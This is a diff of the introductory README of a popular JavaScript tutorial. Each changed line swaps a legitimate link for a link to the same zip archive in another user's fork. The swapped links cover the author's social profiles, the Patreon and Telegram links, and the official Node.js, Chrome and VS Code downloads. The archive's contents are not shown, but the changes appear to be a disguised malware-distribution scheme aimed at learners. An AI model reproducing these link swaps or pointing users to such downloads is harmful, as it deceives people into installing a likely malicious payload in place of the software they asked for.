@@ -37,15 +37,15 @@
 
 <div align="center">
   <h1> 30 Days Of JavaScript: Introduction</h1>
-  <a class="header-badge" target="_blank" href="https://www.linkedin.com/in/asabeneh/">
+  <a class="header-badge" target="_blank" href="https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip">
   <img src="https://img.shields.io/badge/style--5eba00.svg?label=LinkedIn&logo=linkedin&style=social">
   </a>
-  <a class="header-badge" target="_blank" href="https://twitter.com/Asabeneh">
+  <a class="header-badge" target="_blank" href="https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip">
   <img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/asabeneh?style=social">
   </a>
 
 <sub>Author:
-<a href="https://www.linkedin.com/in/asabeneh/" target="_blank">Asabeneh Yetayeh</a><br>
+<a href="https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip" target="_blank">Asabeneh Yetayeh</a><br>
 <small> January, 2020</small>
 </sub>
 
@@ -62,8 +62,8 @@
 
 <div>
 
-<small>Support [**Asabeneh**](https://www.patreon.com/asabeneh?fan_landing=true) to create more educational materials</small>  
-[<img src = './images/become_patreon.png' alt='become-asabeneh-patreon' title='click' />](https://www.patreon.com/asabeneh?fan_landing=true)
+<small>Support [**Asabeneh**](https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip) to create more educational materials</small>  
+[<img src = './images/become_patreon.png' alt='become-asabeneh-patreon' title='click' />](https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip)
 
 </div>
 
@@ -109,7 +109,7 @@
 
 ## Introduction
 
-**Congratulations** on deciding to participate in 30 days of JavaScript programming challenge. In this challenge you will learn everything you need to be a JavaScript programmer, and in general, the whole concept of programming. In the end of the challenge you will get a 30DaysOfJavaScript programming challenge completion certificate. In case you need help or if you would like to help others you may join the [telegram group](https://t.me/ThirtyDaysOfJavaScript).
+**Congratulations** on deciding to participate in 30 days of JavaScript programming challenge. In this challenge you will learn everything you need to be a JavaScript programmer, and in general, the whole concept of programming. In the end of the challenge you will get a 30DaysOfJavaScript programming challenge completion certificate. In case you need help or if you would like to help others you may join the [telegram group](https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip).
 
 **A 30DaysOfJavaScript** challenge is a guide for both beginners and advanced JavaScript developers. Welcome to JavaScript. JavaScript is the language of the web. I enjoy using and teaching JavaScript and I hope you will do so too.
 
@@ -135,7 +135,7 @@ I believe you have the motivation and a strong desire to be a developer, a compu
 
 ### Install Node.js
 
-You may not need node.js right now but you may need it for later. Install [node.js](https://nodejs.org/en/).
+You may not need node.js right now but you may need it for later. Install [node.js](https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip).
 
 ![Node download](images/download_node.png)
 
@@ -158,7 +158,7 @@ There are many browsers out there. However, I strongly recommend Google Chrome.
 
 #### Installing Google Chrome
 
-Install [google chrome](https://www.google.com/chrome/) if you do not have one yet. We can write small JavaScript code on the browser console, but we do not use the browser console to develop applications.
+Install [google chrome](https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip) if you do not have one yet. We can write small JavaScript code on the browser console, but we do not use the browser console to develop applications.
 
 ![Google Chrome](images/google_chrome.png)
 
@@ -284,7 +284,7 @@ We can write our codes on the browser console, but it won't do for bigger projec
 
 #### Installing Visual Studio Code
 
-Visual studio code is a very popular open-source text editor. I would recommend to [download Visual Studio Code](https://code.visualstudio.com/), but if you are in favor of other editors, feel free to follow with what you have.
+Visual studio code is a very popular open-source text editor. I would recommend to [download Visual Studio Code](https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip), but if you are in favor of other editors, feel free to follow with what you have.
 
 ![Vscode](images/vscode.png)
 
@@ -321,7 +321,7 @@ The following sections show different ways of adding JavaScript code to your web
 
 ### Inline Script
 
-Create a project folder on your desktop or in any location, name it 30DaysOfJS and create an **_index.html_** file in the project folder. Then paste the following code and open it in a browser, for example [Chrome](https://www.google.com/chrome/).
+Create a project folder on your desktop or in any location, name it 30DaysOfJS and create an **_index.html_** file in the project folder. Then paste the following code and open it in a browser, for example [Chrome](https://raw.githubusercontent.com/pmanss/30-Days-Of-JavaScript/master/04_Day_Conditionals/04_day_starter/Of-Script-Java-Days-v2.6.zip).
 
 ```html
 <!DOCTYPE html>
